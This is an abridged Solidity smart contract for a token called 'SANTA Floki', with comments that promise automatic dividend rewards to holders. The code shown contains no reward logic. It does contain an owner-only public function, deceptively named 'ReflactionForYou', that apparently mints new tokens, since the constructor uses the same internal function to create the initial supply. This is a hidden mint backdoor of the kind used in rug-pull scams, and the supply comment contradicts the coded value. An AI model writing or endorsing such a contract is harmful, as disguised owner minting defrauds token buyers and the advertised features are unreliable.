...
//
// $SANTA Coin proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN SANTA ! With the auto-claim feature,
// simply hold$ SANTA Coin and you'll receive SANTA Coin automatically in your wallet.
// 
// Hold SANTA Coin and get rewarded in SANTA Coin on every transaction!
//
//
// 
// 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflactionForYou(uint256 amount) public onlyOwner {
    ReflactionForYou(msg.sender, amount);
    }
    ...
    function ReflactionForYou(address account, uint256 amount) internal virtual {
...
contract SANTA is ERC20 {
    ...
    uint tokenTotalSupply = 10000000000; // 100 Million Token Supply

    constructor() public ERC20("SANTA Floki", "SANTA") {
        ReflactionForYou(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}